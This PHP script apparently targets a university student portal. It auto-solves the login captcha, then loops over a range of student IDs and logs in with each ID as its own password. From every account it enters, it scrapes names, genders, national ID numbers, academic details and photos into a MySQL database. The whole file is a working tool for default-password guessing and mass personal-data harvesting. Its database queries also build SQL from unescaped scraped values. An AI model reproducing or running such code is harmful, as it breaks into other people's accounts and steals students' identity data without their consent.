<?php
/**
 * Created by PhpStorm.
 * User: Nigel
 * Date: 2015/12/26
 * Time: 13:36
 */
/**
 * @return mixed 返回获取的验证码二进制流
 */
function &getCaptchaAndCookie() {

    /**
     * mode=3 请求登陆页面,没必要请求这个页面，直接请求验证码，然后向mode=4 post数据就行
     * mode=4 post数据，验证登陆请求，成功则返回一个登陆成功的消息
     * mode= 不带参数，登陆成功后返回查询中心页面
     */
    //$login_url = "http://202.118.31.197/ACTIONLOGON.APPPROCESS?mode=";

    /**
     * id 的意义不明
     */
    $id             = '99.44218073964404';
    $verfy_code_url = "http://202.118.31.197/ACTIONVALIDATERANDOMPICTURE.APPPROCESS?id=$id";

    //获取验证码并保存cookie
    $ch       = curl_init();
    $header[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0 FirePHP/0.7.4';
    $header[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8';
    $header[] = 'Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3';
    $header[] = 'Accept-Encoding: gzip, deflate';
    $header[] = 'x-insight: activate';
    $header[] = 'Connection: keep-alive';
    $header[] = 'Cache-Control: max-age=0;';
    curl_setopt($ch, CURLOPT_URL, $verfy_code_url);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, 1);
    //保存获取到的cookie
    curl_setopt($ch, CURLOPT_COOKIEJAR, __DIR__ . "\\cookie.txt");
    //curl_setopt($ch, CURLOPT_VERBOSE, 1);
    $captcha = curl_exec($ch);
    curl_close($ch);

    return $captcha;
    //$random = rand(0, 1000);
    //$filename = "./captcha/captcha-{$random}.jpg";
    //$filename = 'captcha.jpg';
    //$fp       = fopen($filename, 'w');
    //fwrite($fp, $captcha);
    //fclose($fp);
}

/**
 * Created by PhpStorm.
 * User: Nigel
 * Date: 2015/12/26
 * Time: 15:15
 */

/**
 * @param $id      string
 * @param $pass    string
 * @param $captcha string
 */
function login($id, $pass, $captcha) {

    //带着申请验证码得到的cookie，和自己填写的验证码，以及表单数据，去访问登陆页面
    //如果登陆不成功，则说明验证码的id有作用
    $post = array(
        "WebUserNO" => $id,
        "applicant" => "",
        "Password"  => $pass,
        "Agnomen"   => $captcha);
    $post = http_build_query($post) . "&submit7=%B5%C7%C2%BC";
    //$post      = 'WebUserNO=' . urlencode($id) . '&applicant=' . urlencode($applicant) . '&Password=' . urlencode($pass) . '&Agnomen=' . urlencode($captcha) . '&submit7=' . $submit7;
    /**
     * mode=3 请求登陆页面,没必要请求这个页面，直接请求验证码，然后向mode=4 post数据就行
     * mode=4 post数据，验证登陆请求，成功则返回一个登陆成功的消息
     * mode= 不带参数，登陆成功后返回查询中心页面
     * 问题是，并不会简单的返回这个登陆中心，而是跳转到这个http://202.118.31.197/ACTIONLOGON.APPPROCESS?mode=
     * 里面会请求好几个相对路径的iframe，真是烦死了…
     * 这里仅仅是登陆
     */
    $login_url = "http://202.118.31.197/ACTIONLOGON.APPPROCESS?mode=";

    $header[] = 'Connection: keep-alive';
    $header[] = 'Cache-Control: max-age=0';
    $header[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8';
    $header[] = 'Origin: http://202.118.31.197';
    $header[] = 'Upgrade-Insecure-Requests: 1';
    $header[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.80 Safari/537.36';
    $header[] = 'Content-Type: application/x-www-form-urlencoded;charset=gb2312';

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $login_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
    curl_setopt($ch, CURLOPT_COOKIEFILE, __DIR__ . "/cookie.txt");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_REFERER, 'http://202.118.31.197/index.jsp');
    $test = curl_exec($ch);
    curl_close($ch);
    ////$info = curl_getinfo($ch);
    //if ($test === false) {
    //    //trigger_error(sprintf("%s -登陆失败: %s", curl_errno($ch), curl_error($ch)));
    //    //error_log("登陆失败");
    //    echo "fail: " . $id . "\n";
    //
    //    return false;
    //    //如果仍停留在登陆界面，则密码或者账号错误
    //} elseif (false !== strpos($test, 'alert("请输入正确的附加码\n");')) {
    //    //header('content-type:text/html;charset=gb2312');
    //    //echo "账号或密码有误!";
    //    //exit();
    //    echo "fail: " . $id . "\n";
    //
    //    return false;
    //} else {
    if (false !== strpos($test,
                         'frame marginheight="0" marginwidth="0" noresize scrolling="yes" name="mainFrame" src="ACTIONFINDSTUDENTINFO.APPPROCESS">')
    ) {
        echo "success: " . $id . "\n";

        return true;
    }

    return false;
}

/**
 * @return array 获取的数据
 */
function &getInfo() {

    //获取信息并显示
    //$topFrame  = "http://202.118.31.197/TopFrame.jsp?UserType=BASE_STUDENT";
    //$menuFrame = "http://202.118.31.197/Menu.jsp?UserType=BASE_STUDENT";
    $mainFrame = "http://202.118.31.197/ACTIONFINDSTUDENTINFO.APPPROCESS";
    $infoFrame = "http://202.118.31.197/ACTIONFINDSTUDENTINFO.APPPROCESS?mode=1&showMsg=";
    //$photo     = "http://202.118.31.197/ACTIONDSPUSERPHOTO.APPPROCESS";

    //获取基本信息
    $ch = curl_init($infoFrame);
    curl_setopt($ch, CURLOPT_COOKIEFILE, __DIR__ . "/cookie.txt");
    curl_setopt($ch, CURLOPT_REFERER, $mainFrame);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    //follow redirects
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_AUTOREFERER, true);
    curl_setopt($ch, CURLOPT_MAXREDIRS, 2);

    //header("content-type:text/html; charset=GBK");
    $info = curl_exec($ch);
    curl_close($ch);
    //分隔符的问题
    //$info = preg_replace('{<img src="/ACTIONDSPUSERPHOTO.APPPROCESS"}', "<img src=\"./img/$id.bmp\"", $info, 1);

    $html  = preg_replace('/&nbsp;/', '', $info);
    $dom   = new simple_html_dom($html);
    $info  = array();
    $false = false;

    if ($dom === null) {
        return $false;
    }
    foreach ($dom->find("table[width=100%] tr") as $tr) {
        if ($tr->children(2)) {
            $info[] = $tr->children(2)->innertext;
        }
        if ($tr->children(4)) {
            $info[] = $tr->children(4)->innertext;
        }
    }
    if (count($info) < 28) {

        return $false;
    }

    return $info;
}

function getPhoto($id) {

    //获取图片
    $photo     = "http://202.118.31.197/ACTIONDSPUSERPHOTO.APPPROCESS";
    $infoFrame = "http://202.118.31.197/ACTIONFINDSTUDENTINFO.APPPROCESS?mode=1&showMsg=";
    $ch        = curl_init($photo);
    curl_setopt($ch, CURLOPT_COOKIEFILE, __DIR__ . "/cookie.txt");
    curl_setopt($ch, CURLOPT_REFERER, $infoFrame);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    $img = curl_exec($ch);
    curl_close($ch);
    //header("Content-Type:image/jepg");
    $fp = fopen("./img/" . $id . ".bmp", 'w');
    fwrite($fp, $img);
    fclose($fp);
}

require_once "Captcha.php";
require_once "sdk/simple_html_dom.php";
//ignore_user_abort(); //即使Client断开(如关掉浏览器)，PHP脚本也可以继续执行.
set_time_limit(0); // 执行时间为无限制，php默认的执行时间是30秒，通过set_time_limit(0)可以让程序无限制的执行下去
$interval = 1;
$dbc = mysqli_connect('localhost:3306', 'nigel', 'nigel', 'neu') or die("Error connecting to MySQL server.");
//mysqli_query("set character set 'gbk'");//读库
//mysql_query("set names 'gbk'");//写库
mysqli_set_charset($dbc, 'gbk');
//mysqli_select_db($dbc, 'neu');
for ($id = 20115570; $id < 20119999; $id += 10) {

    $img = getCaptchaAndCookie();
    if ($img !== false) {
        $captcha = new Captcha($img);
        if (login(strval($id), strval($id), $captcha->result)) {
            if ($info = getInfo()) {
                getPhoto(strval($id));

                $isExist = "select * from info WHERE id='$id'";
                $res     = mysqli_query($dbc, $isExist);
                if (mysqli_fetch_array($res)) {
                    sleep($interval);
                    continue;
                }

                $query = "INSERT INTO info(id, name, gender, social_id,school,enter_year,major,how_long,class,grade,type)
             VALUES('$info[0]', '$info[2]','$info[5]', '$info[16]', '$info[21]', '$info[22]',
             '$info[23]', '$info[24]', '$info[25]', '$info[27]','$info[28]')";

                mysqli_query($dbc, $query) or die('Error querying database.');
                //header('content-type:text/html;charset=gb2312');
                //var_dump($info);
            }
        }
        sleep($interval);
    } else {
        $id--;
    }
}
mysqli_close($dbc);

